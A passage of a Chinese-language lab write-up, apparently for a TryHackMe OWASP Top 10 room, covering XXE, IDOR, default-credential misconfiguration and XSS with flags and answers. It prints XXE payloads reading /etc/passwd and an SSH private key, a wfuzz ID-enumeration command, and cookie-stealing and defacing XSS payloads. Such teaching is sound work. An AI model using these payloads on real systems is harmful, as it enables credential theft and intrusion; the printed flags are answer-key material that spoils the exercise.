+<p>现在让我们来了解 DTD 是如何验证 XML文档信息的，以下是<code>note.dtd</code>文件中的DTD术语的含义（下面的DTD术语和上面的XML文档示例内容存在对应关系）：</p>
+<ul>
+<li><code>!DOCTYPE note</code> - 定义名为<code>note</code> 的XML文档根元素（根元素为note）</li>
+<li><code>!ELEMENT note</code> - 定义根元素<code>note</code>必须包含子元素：“<code>to</code>, <code>from</code>, <code>heading</code>, <code>body</code>”</li>
+<li><code>!ELEMENT to</code> - 将<code>to</code>元素定义为“#PCDATA”类型</li>
+<li><code>!ELEMENT from</code> - 将 <code>from</code> 元素定义为“#PCDATA”类型</li>
+<li><code>!ELEMENT heading</code> - 将<code>heading</code>元素定义为“#PCDATA”类型</li>
+<li><code>!ELEMENT body</code> - 将<code>body</code>元素定义为“#PCDATA”类型</li>
+</ul>
+<p>注意：#PCDATA 表示可解析的字符数据。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204235609263.png"
+                      alt="image-20221204235609263"
+                ></p>
+<blockquote>
+<p>在DTD文件中定义一个新实体：!ENTITY</p>
+</blockquote>
+<h2 id="严重程度TOP4-XXE漏洞-XXE-Payload"><a href="#严重程度TOP4-XXE漏洞-XXE-Payload" class="headerlink" title="[严重程度TOP4] XXE漏洞-XXE Payload"></a>[严重程度TOP4] XXE漏洞-XXE Payload</h2><p>现在我们将查看一些 XXE payload并了解它们是如何工作的。</p>
+<p>1.我们将看到的第一个有效载荷非常简单。 如果你掌握前面的知识点，那么你将很容易理解此有效载荷。</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;feast&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstName</span>&gt;</span>falcon<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>正如我们在上例中所看到的，我们首先定义一个名为 <code>name</code> 的 <code>ENTITY</code> (实体)并为其分配一个值<code>feast</code>，并随后在示例代码中使用该<code>ENTITY</code>。</p>
+<p>2.我们也可以使用以下XXE payload，通过定义一个<code>ENTITY</code>并让它使用<code>SYSTEM</code>关键字来从目标系统中读取一些文件信息。</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>同样，在上例中我们定义了一个名为 <code>read</code> 的 <code>ENTITY</code>(实体)，但不同之处在于 我们将其值设置为“<code>SYSTEM</code>”并指定了文件路径。</p>
+<p>如果我们使用这个 payload，那么在易受 XXE 攻击的目标网站页面上（通常）就会显示文件<code>/etc/passwd</code> 的内容。我们也可以使用这种有效载荷来尝试读取其他文件信息，但很多时候你可能会读取失败，这也许是因为你所读取的文件本身并不支持以XXE响应消息的方式被查看。</p>
+<h2 id="严重程度TOP4-XXE漏洞利用"><a href="#严重程度TOP4-XXE漏洞利用" class="headerlink" title="[严重程度TOP4] XXE漏洞利用"></a>[严重程度TOP4] XXE漏洞利用</h2><p>现在让我们使用前文所提到的有效载荷进行XXE漏洞利用。</p>
+<p>1.让我们看看如果我们尝试使用payload来显示名称(name)，目标网站将如何响应。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205111742729.png"
+                      alt="image-20221205111742729"
+                ></p>
+<p>tips：上图为BurpSuite使用界面。</p>
+<p>在上图的左侧，我们可以看到一个burp请求：这将向目标站点发送 使用 URL 编码的payload(具体的payload内容见上一小节知识点)；在上图的右侧我们可以看到使用该payload之后，在目标站点的页面上能够成功显示名称(name)值<code>falcon feast</code>。</p>
+<p>2.现在让我们尝试读取 <code>/etc/passwd</code>文件内容</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205112504755.png"
+                      alt="image-20221205112504755"
+                ></p>
+<p>能够成功读取(使用的payload同样经过了URL编码，具体的payload内容见上一小节知识点)。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205112734898.png"
+                      alt="image-20221205112734898"
+                ></p>
+<p>启动目标机器，访问目标站点，进行XXE漏洞利用：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205190226634.png"
+                      alt="image-20221205190226634"
+                ></p>
+<p>在攻击框中使用XXE payload–用于显示name值（此处显示的是自己在XML中设定的某个name值）：</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;feast&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstName</span>&gt;</span>Hihihi<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205190347909.png"
+                      alt="image-20221205190347909"
+                ></p>
+<p>在攻击框中使用XXE payload–用于查看<code>/etc/passwd</code>文件内容，获取目标站点所对应系统的当前用户名：</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205191515365.png"
+                      alt="image-20221205191515365"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205190725517.png"
+                      alt="image-20221205190725517"
+                ></p>
+<p>在Linux系统中，用户对应的SSH密钥的默认保存路径为***&#x2F;home&#x2F;用户名&#x2F;.ssh&#x2F;id_rsa*** ；此处的用户名为falcon，所以路径为<code>/home/falcon/.ssh/id_rsa</code>。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205190035962.png"
+                      alt="image-20221205190035962"
+                ></p>
+<p>在攻击框中使用XXE payload–用于查看当前用户falcon的私钥内容：</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///home/falcon/.ssh/id_rsa&#x27;</span>&gt;</span>]&gt;</span>                                                    </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205191357202.png"
+                      alt="image-20221205191357202"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205191242778.png"
+                      alt="image-20221205191242778"
+                ></p>
+<blockquote>
+<p>falcon的私钥前18个字符：MIIEogIBAAKCAQEA7</p>
+</blockquote>
+<h2 id="严重程度TOP5-损坏的访问控制"><a href="#严重程度TOP5-损坏的访问控制" class="headerlink" title="[严重程度TOP5] 损坏的访问控制"></a>[严重程度TOP5] 损坏的访问控制</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205112914400.png"
+                      alt="image-20221205112914400"
+                ></p>
+<p>目标网站的某些页面可能会受到保护，从而不允许常规访问者对相关页面进行访问，例如，只有网站的管理员(admin)用户才能被允许访问 用于管理其他用户的网站页面；如果目标网站的常规访问者能够访问他们无权查看的受保护页面，那么就代表目标站点的访问控制正处于损坏状态。</p>
+<p>如果 网站的普通访问者能够访问受保护的页面，可能会导致以下情况：</p>
+<ul>
+<li>能够查看目标站点的一些敏感信息。</li>
+<li>能够访问目标站点上 未经授权的功能。</li>
+</ul>
+<p>OWASP 列出了一些<a class="link"   target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html" >展示访问控制漏洞的攻击场景 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p>
+<p><em><strong>场景#1</strong></em>-在通过web应用程序访问帐户信息的 SQL 调用中注入未经验证的数据：</p>
+<blockquote>
+<p>pstmt.setString(1, request.getParameter(“acct”));</p>
+<p>ResultSet results &#x3D; pstmt.executeQuery( );</p>
+</blockquote>
+<p>攻击者只需修改浏览器URL中的“acct”参数即可发送他们想要访问的任何帐号ID，如果该调用没有经过正确的验证处理，那么攻击者就可以访问任何用户的帐户信息，例：</p>
+<blockquote>
+<p><a href="http://example.com/app/accountInfo?acct=notmyacct">http://example.com/app/accountInfo?acct=notmyacct</a></p>
+</blockquote>
+<p><em><strong>场景#2</strong></em>-攻击者强制浏览目标 URL（访问管理页面通常是需要管理员权限的）。</p>
+<blockquote>
+<p><a href="http://example.com/app/getappInfo">http://example.com/app/getappInfo</a></p>
+<p><a href="http://example.com/app/admin_getappInfo">http://example.com/app/admin_getappInfo</a></p>
+</blockquote>
+<p>如果未经身份验证的用户可以访问目标站点的任何一个页面，则说明目标网站存在访问控制缺陷；如果非管理员用户可以访问管理页面，也说明目标网站存在访问控制缺陷。</p>
+<p>简而言之，损坏的访问控制将<em><strong>允许攻击者绕过授权</strong></em>（即：发生越权操作），这可以让他们像特权用户(此处不单指admin用户，而是指相对于普通用户权限更高的用户)一样查看敏感数据或者执行其他操作。</p>
+<h2 id="严重程度TOP5-损坏的访问控制（IDOR-练习）"><a href="#严重程度TOP5-损坏的访问控制（IDOR-练习）" class="headerlink" title="[严重程度TOP5] 损坏的访问控制（IDOR 练习）"></a>[严重程度TOP5] 损坏的访问控制（IDOR 练习）</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205121133524.png"
+                      alt="image-20221205121133524"
+                ></p>
+<p>IDOR，或者被称为不安全的直接对象引用( Insecure Direct Object Reference)，是一种利用 用户输入处理方式中的错误配置(目标站点方的设置错误)来访问通常无法访问的资源的行为，IDOR 是一种访问控制漏洞。</p>
+<p><strong>例子：</strong></p>
+<p>假设我们正在登录我们的银行账户，在正确通过身份验证之后，我们被导航至一个URL<code>https://example.com/bank?account_number=1234</code>，在该URL对应的网站页面上，我们可以看到自己的银行账户详细信息，并能执行一些常规操作。</p>
+<p>然而，这里存在一个潜在的问题，在攻击者将 <code>account_number</code> 参数更改为 1235 等其他内容之后，如果目标站点存在相关的配置错误，那么攻击者就可以访问其他用户所对应的银行账户详细信息。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205192842586.png"
+                      alt="image-20221205192842586"
+                ></p>
+<p>启动目标机器，利用已知信息(用户名：noot、密码：test1234)进行用户登录操作：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205194722934.png"
+                      alt="image-20221205194722934"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205194749516.png"
+                      alt="image-20221205194749516"
+                ></p>
+<p>进行IDOR测试，更改浏览器URL栏中的参数值（修改为：?note&#x3D;0），尝试访问与其他用户相关的资源并获取flag：</p>
+<p>tips：使用FUZZ工具（如wfuzz）进行测试–<code>?note=FUZZ</code>范围设置为0到100即可。</p>
+<p><code>wfuzz -c --hh 0 -z range,0-100 http://10.10.224.32/note.php?note=FUZZ</code></p>
+<p>只有0和1对应的响应码为200。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205194844060.png"
+                      alt="image-20221205194844060"
+                ></p>
+<blockquote>
+<p>flag为：flag{fivefourthree} </p>
+</blockquote>
+<h2 id="严重程度TOP6-安全配置错误"><a href="#严重程度TOP6-安全配置错误" class="headerlink" title="[严重程度TOP6] 安全配置错误"></a>[严重程度TOP6] 安全配置错误</h2><p><strong>安全配置错误</strong></p>
+<p>安全配置错误与其他OWASP-TOP10漏洞不同，因为它发生在本可以正确配置但未正确配置安全性机制的情况下。</p>
+<p>安全配置错误包括：</p>
+<ul>
+<li>对云服务（如 S3 存储桶）的权限配置不当。</li>
+<li>启用不必要的功能，例如某些服务、页面、帐户或权限。</li>
+<li>使用密码未更改的默认帐户。</li>
+<li>过于详细的错误消息提示，这将使攻击者可以找到有关目标系统的更多信息。</li>
+<li>不使用<a class="link"   target="_blank" rel="noopener" href="https://owasp.org/www-project-secure-headers/" >HTTP安全标头 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，或在web服务器中透露太多细节：通过HTTP 标头泄露。</li>
+</ul>
+<p>此漏洞通常会导致更多漏洞产生，例如允许攻击者使用默认凭据以访问某些敏感数据、允许攻击者执行 发生在admin页面上的 XXE注入或命令注入。</p>
+<p>有关安全配置错误的更多信息，建议查看OWASP相关页面： <a class="link"   target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" >https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>安全配置错误案例-使用默认密码</strong></p>
+<p>应用程序的所有者可以并且也应该去更改该应用程序所使用的默认密码，但他们经常不会这样做。使用默认密码在嵌入式和物联网(IoT-Internet of Things)设备中尤为常见，大多数时候设备的所有者并不会去更改这些密码。</p>
+<p>从攻击者的角度看，攻击方很容易尝试利用默认凭据来执行一些本不应该被允许的操作，他们能够访问管理员仪表面板、访问为系统管理员或制造商而设计的某些服务，甚至能够访问网络基础设施–这在针对企业进行攻击时可能非常有用。管理员使用默认凭证的负面影响可能很严重，从敏感信息泄露到 RCE攻击 都有可能发生。</p>
+<p>2016 年 10 月，Dyn（一家 DNS 提供商）因过去 10 年最令人难忘的 DDoS 攻击之一而下线，大量恶意流量主要来自物联网设备和网络设备，如路由器、调制解调器，它们在这次DDoS 攻击中被 Mirai 恶意软件感染。</p>
+<p>恶意软件是如何接管系统的？ 答案是通过利用默认密码，该恶意软件有一个包含 63 个用户名&#x2F;密码对的列表，并以此试图登录已经暴露的 telnet 服务。</p>
+<p>这次 DDoS 攻击引人注目，因为它使许多大型网站和服务脱机。 Amazon、Twitter、Netflix、GitHub、Xbox Live、PlayStation Network 和更多服务在这场针对 Dyn 的 3 波 DDoS 攻击中被波及以致于离线数小时。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205200748825.png"
+                      alt="image-20221205200748825"
+                ></p>
+<p>启动目标机器，访问目标站点：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205205103801.png"
+                      alt="image-20221205205103801"
+                ></p>
+<p>尝试使用以下方法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 通过修改URL，查看目标站点的readme.txt文件</span><br><span class="line">2. 通过修改URL，查看目标站点可能存在的页面--http[s]://url/docs</span><br><span class="line">3. 通过修改URL，查看目标站点可能存在的页面--http[s]://url/documentation</span><br><span class="line">4. 通过修改URL，查看目标站点的changelog.txt文件</span><br><span class="line">5. 通过修改URL，查看目标站点的README.md文件</span><br><span class="line">6. 查看页面源代码中的注释内容、查看页面源代码中的js文件内容......</span><br><span class="line">7. 利用网页中的关键字，在GitHub上面搜索相关的存储库，找到存储库之后查看README.md文件内容。</span><br><span class="line">8. 使用dirbuster/gobuster进行网站目录爆破 </span><br></pre></td></tr></table></figure></div>
+
+<p>最后，我们可以在GitHub中找到目标站点相关的项目（搜索关键词<em><strong>Pensive Notes</strong></em>）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205211241697.png"
+                      alt="image-20221205211241697"
+                ></p>
+<p>在相关项目的README.md文档中找到默认登录凭据：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205211409131.png"
+                      alt="image-20221205211409131"
+                ></p>
+<blockquote>
+<p>pensive:PensiveNotes</p>
+</blockquote>
+<p>使用刚才发现的默认凭据进行网站登录并获取flag：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205211541267.png"
+                      alt="image-20221205211541267"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205211630960.png"
+                      alt="image-20221205211630960"
+                ></p>
+<blockquote>
+<p>flag为：thm{4b9513968fd564a87b28aa1f9d672e17}</p>
+</blockquote>
+<h2 id="严重程度TOP7-跨站脚本（XSS漏洞）"><a href="#严重程度TOP7-跨站脚本（XSS漏洞）" class="headerlink" title="[严重程度TOP7] 跨站脚本（XSS漏洞）"></a>[严重程度TOP7] 跨站脚本（XSS漏洞）</h2><p><strong>XSS 概念解释</strong></p>
+<p>跨站点脚本，也被称为 XSS，是一种经常能够在 Web 应用程序中被发现的安全漏洞。XSS是一种注入漏洞，攻击者可以构造恶意脚本并能够让该脚本在受害者的机器上被成功执行。</p>
+<p>如果 Web 应用程序使用未经过滤的“用户输入”，则该应用程序很容易受到 XSS 攻击。 XSS在 Javascript、VBScript、Flash 和 CSS 中都是可能发生的，跨站点脚本主要分为三种类型：</p>
+<ol>
+<li>存储型 XSS - 最危险的 XSS 类型，往往是网站数据库中的恶意字符串的来源；如果网站允许“用户输入”在插入到数据库时未经过<em><strong>清理</strong></em>（删除用户输入的“恶意部分”），则通常会发生这种类型的XSS。</li>
+<li>反射型 XSS - 如果XSS Payload是受害者对网站请求的一部分，那么该网站则会包含此payload然后响应用户的请求；总而言之，攻击者需要诱骗受害者点击一个 URL链接来执行攻击者所构造的XSS Payload。</li>
+<li>基于 DOM 的 XSS - DOM 指文档对象模型，它是 HTML 和 XML 文档的编程接口，它能代表网站页面，以便程序对文档结构、样式和内容进行更改。你可以将网页理解为一个文档，这个文档可以显示在浏览器窗口中或者作为 HTML 源文件显示。</li>
+</ol>
+<p>如需更多关于 XSS 的解释和练习，请查看XSS相关笔记。</p>
+<p><strong>XSS Payloads</strong></p>
+<p>跨站点脚本是一个漏洞，我们可以利用它在受害者的机器上执行恶意 Javascript，请查看一些常用的XSS Payload类型：</p>
+<ul>
+<li>弹消息框 (<code>&lt;script&gt;alert(“Hello World”)&lt;/script&gt;</code>) ：在目标用户的浏览器上创建一个 Hello World 消息弹出窗口。</li>
+<li>覆盖 HTML (<code>document.write</code>)：覆盖网站的 HTML 以添加攻击者所输入的内容（基本上破坏了 正常用户对完整页面的阅读体验）。</li>
+<li>键盘记录器-XSS Keylogger ( <a class="link"   target="_blank" rel="noopener" href="http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html" >http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ) ：可用于记录用户的键盘敲击情况，以捕获目标用户在网站页面上所输入的密码信息和其他敏感信息。</li>
+<li>端口扫描器-Port scanning ( <a class="link"   target="_blank" rel="noopener" href="http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html" >http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ) ：一个mini的本地端口扫描器。</li>
+</ul>
+<p>XSS-Payloads.com ( <a class="link"   target="_blank" rel="noopener" href="http://www.xss-payloads.com/" >http://www.xss-payloads.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ) 是一个存储与 XSS 相关的Payload、工具、文档等内容的网站。 你可以在该网站下载XSS Payload，这些XSS Payload能实现 通过网络摄像头拍摄快照，或者实现一些端口扫描器和网络扫描器的相关功能。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205223354015.png"
+                      alt="image-20221205223354015"
+                ></p>
+<p>已知提示信息：</p>
+<ul>
+<li>提示1.在 Javascript <code>window.location.hostname</code> 中将显示当前主机名，你部署的机器的主机名将是其 IP 地址。</li>
+<li>提示2.<code>&lt;script&gt;document.querySelector(&#39;#thm-title&#39;).textContent = &#39;I am a hacker&#39;&lt;/script&gt;</code>。</li>
+</ul>
+<p>启动目标机器，访问目标站点，完成注册并进行登录：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205230328062.png"
+                      alt="image-20221205230328062"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205230434516.png"
+                      alt="image-20221205230434516"
+                ></p>
+<p>导航至<a class="link"   target="_blank" rel="noopener" href="http://machine_ip/reflected%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8BXSS" >http://Machine_IP/reflected页面，使用以下XSS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Payload（这将弹窗并显示一些文本内容），成功执行Payload之后会得到Answer：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(“<span class="title class_">Hello</span>”)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205230649858.png"
+                      alt="image-20221205230649858"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205230552515.png"
+                      alt="image-20221205230552515"
+                ></p>
+<blockquote>
+<p>ThereIsMoreToXSSThanYouThink</p>
+</blockquote>
+<p>继续使用&#x2F;reflected页面，输入以下XSS Payload（这将弹窗并显示hostname，此处为ip地址），成功执行Payload之后会得到一个Answer：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hostname</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205230729646.png"
+                      alt="image-20221205230729646"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205230748169.png"
+                      alt="image-20221205230748169"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205230807046.png"
+                      alt="image-20221205230807046"
+                ></p>
+<blockquote>
+<p>ReflectiveXss4TheWin</p>
+</blockquote>
+<p>导航至<a class="link"   target="_blank" rel="noopener" href="http://machine_ip/stored%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8BXSS" >http://Machine_IP/stored页面，使用以下XSS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Payload（这将插入HTML内容），成功执行Payload之后会得到一个Answer：</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hi my name is Hekeats<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205230910716.png"
+                      alt="image-20221205230910716"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205231009442.png"
+                      alt="image-20221205231009442"
+                ></p>
+<blockquote>
+<p>HTML_T4gs</p>
+</blockquote>
+<p>继续使用&#x2F;stored页面，输入以下XSS Payload（这将弹窗并显示cookie值），成功执行Payload之后会得到一个Answer：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205231235282.png"
+                      alt="image-20221205231235282"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205231306286.png"
+                      alt="image-20221205231306286"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205231321702.png"
+                      alt="image-20221205231321702"
+                ></p>
+<blockquote>
+<p>W3LL_D0N3_LVL2</p>
+</blockquote>
+<p>继续使用&#x2F;stored页面，输入以下XSS Payload（这将更改HTML页面值），成功执行Payload之后会得到一个Answer，如果没有显示 请自行刷新页面：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#thm-title&#x27;</span>).<span class="property">textContent</span> = <span class="string">&#x27;I am a hacker&#x27;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205231513004.png"
+                      alt="image-20221205231513004"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205231829102.png"
+                      alt="image-20221205231829102"
+                ></p>
+<blockquote>
+<p>websites_can_be_easily_defaced_with_xss</p>
+</blockquote>
+<h2 id="严重程度TOP8-不安全的反序列化（反序列化漏洞）"><a href="#严重程度TOP8-不安全的反序列化（反序列化漏洞）" class="headerlink" title="[严重程度TOP8] 不安全的反序列化（反序列化漏洞）"></a>[严重程度TOP8] 不安全的反序列化（反序列化漏洞）</h2><p>“不安全的反序列化是一种漏洞，当不受信任的数据被用于滥用应用程序的逻辑时就会发生这种情况”（Acunetix，2017 年）</p>
+<p>这个定义还是很宽泛的，简而言之，不安全的反序列化就是用恶意代码替换应用程序将要处理的数据；这将允许发生 DoS（拒绝服务）攻击、RCE（远程代码执行）攻击等一系列的攻击行为，攻击者可以利用不安全的反序列化在渗透测试场景中获得立足点。</p>
